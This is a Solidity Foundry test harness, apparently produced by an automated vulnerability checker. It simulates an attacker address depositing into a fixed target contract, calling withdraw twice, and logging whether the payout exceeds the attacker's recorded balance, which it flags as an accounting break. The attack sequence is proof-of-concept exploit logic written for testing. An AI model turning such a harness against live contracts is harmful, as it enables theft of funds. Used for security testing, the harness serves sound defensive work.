// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakRepeat is Test {
    address constant TARGET = address(uint160(0x005fbdb2315678afecb367f032d93f642f64180aa3));
    address constant ATTACKER = address(uint160(0x00BEEF000000000000000000000000000000000042));

    function test_break_repeat() public {
        // Fund the attacker before any payable setup call. Otherwise a seeded
        // deposit/credit path can revert for lack of ETH and masquerade as a
        // protocol-level accounting observation.
        vm.deal(ATTACKER, 100 ether);

        bytes memory setupData = abi.encodeWithSignature("deposit()");
        vm.prank(ATTACKER);
        (bool setupSuccess, bytes memory setupReturndata) = TARGET.call{value: 10 ether}(setupData);
        console2.log("SETUP_SUCCESS", setupSuccess);
        console2.log("SETUP_RETURNDATA_LENGTH", setupReturndata.length);
        

        uint256 entitlementBefore = 0;
        bool entitlementReadOk = false;
        {
            (bool ok, bytes memory data) = TARGET.staticcall(
                abi.encodeWithSignature("balances(address)", address(ATTACKER))
            );
            entitlementReadOk = ok && data.length >= 32;
            if (entitlementReadOk) entitlementBefore = abi.decode(data, (uint256));
        }

        bytes memory data = abi.encodeWithSignature("withdraw(address,uint256)", address(ATTACKER), 1);

        // Measure withdrawal gains only after setup has established the attacker's entitlement.
        uint256 targetBefore = TARGET.balance;
        uint256 attackerBefore = ATTACKER.balance;

        vm.prank(ATTACKER);
        (bool first, bytes memory firstReturndata) = TARGET.call{value: 0}(data);

        uint256 targetMid = TARGET.balance;
        uint256 attackerMid = ATTACKER.balance;

        uint256 entitlementAfterFirst = 0;
        {
            (bool ok, bytes memory data) = TARGET.staticcall(
                abi.encodeWithSignature("balances(address)", address(ATTACKER))
            );
            if (ok && data.length >= 32) entitlementAfterFirst = abi.decode(data, (uint256));
        }

        vm.prank(ATTACKER);
        (bool second, bytes memory secondReturndata) = TARGET.call{value: 0}(data);

        uint256 targetAfter = TARGET.balance;
        uint256 attackerAfter = ATTACKER.balance;

        uint256 entitlementAfterSecond = 0;
        {
            (bool ok, bytes memory data) = TARGET.staticcall(
                abi.encodeWithSignature("balances(address)", address(ATTACKER))
            );
            if (ok && data.length >= 32) entitlementAfterSecond = abi.decode(data, (uint256));
        }

        uint256 totalGain = attackerAfter > attackerBefore ? attackerAfter - attackerBefore : 0;
        uint256 totalTargetOutflow = targetBefore > targetAfter ? targetBefore - targetAfter : 0;

        console2.log("LOWKEY_BREAK_FAMILY", "accounting");
        console2.log("FIRST_SUCCESS", first);
        console2.log("SECOND_SUCCESS", second);
        console2.log("FIRST_RETURNDATA_LENGTH", firstReturndata.length);
        console2.log("SECOND_RETURNDATA_LENGTH", secondReturndata.length);
        console2.log("TOTAL_ATTACKER_GAIN", totalGain);
        console2.log("TOTAL_TARGET_OUTFLOW", totalTargetOutflow);
        console2.log("ENTITLEMENT_READ_OK", entitlementReadOk);
        console2.log("ENTITLEMENT_BEFORE", entitlementBefore);
        console2.log("ENTITLEMENT_AFTER_FIRST", entitlementAfterFirst);
        console2.log("ENTITLEMENT_AFTER_SECOND", entitlementAfterSecond);

        // A second successful withdrawal is normal when the attacker still has entitlement.
        // BREAK requires demonstrated payout greater than the entitlement recorded before attack.
        bool breakByEntitlement = entitlementReadOk
            && totalGain > entitlementBefore;
        // Without an entitlement baseline, repeated value movement is only an
        // observation. Do not label a normal second payout as an accounting BREAK.
        if (breakByEntitlement) {
            console2.log("LOWKEY_BREAK", true);
        } else {
            console2.log("LOWKEY_BREAK", false);
        }

        targetMid; attackerMid;
    }
}
